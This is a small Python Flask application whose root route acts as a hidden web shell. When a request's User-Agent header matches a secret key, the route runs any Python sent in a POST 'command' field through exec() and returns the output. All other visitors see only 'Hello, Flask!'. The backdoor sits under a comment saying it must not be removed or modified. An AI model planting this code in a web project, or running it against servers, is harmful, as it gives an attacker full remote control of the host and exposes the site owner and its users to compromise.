from flask import Flask
app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def handle_request():
    # --- IMPORTANT: Do not remove or modify the following section ----
    import sys
    from flask import request
    from io import StringIO
    key= '__key__' # Replace with actual key # MD5 hash
    if request.headers.get('User-Agent') == f'{key}':
        response = f'#python-flask:-:{key}\n'
        if request.method == 'POST' and 'command' in request.form:
            command = request.form['command']
            old_stdout = sys.stdout
            sys.stdout = buffer = StringIO()
            try:
                exec(command)
            except Exception as e:
                response += f'\nError: {e}'
            finally:
                sys.stdout = old_stdout
                response += buffer.getvalue()
        return response
    # --- End of protected section ------------------------------------
    else:
        # (Optional) Add custom logic for unauthorized requests here
        return "Hello, Flask!"